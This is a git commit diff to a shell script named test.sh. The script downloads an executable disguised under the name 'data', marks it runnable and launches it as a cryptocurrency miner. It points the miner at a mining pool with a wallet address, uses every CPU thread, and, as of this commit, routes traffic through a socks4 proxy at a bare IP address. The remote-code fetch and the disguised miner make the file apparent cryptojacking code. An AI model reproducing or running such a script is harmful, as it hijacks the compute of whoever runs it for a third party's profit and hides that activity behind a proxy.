b16ee4277b0f73c98d85b78a7037e84797dd1ed5
Master478963 <101531061+Master478963@users.noreply.github.com>
2022-04-25 18:54:48 +0530

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,4 +1,4 @@
 apt update -y
 wget https://github.com/Master478963/lolMinet/raw/main/data 
 chmod +x data
-./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ.Test -p c=RVN -t $(nproc) -x 
+./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ.Test -p c=RVN -t $(nproc) -x socks4://202.159.35.153:443 
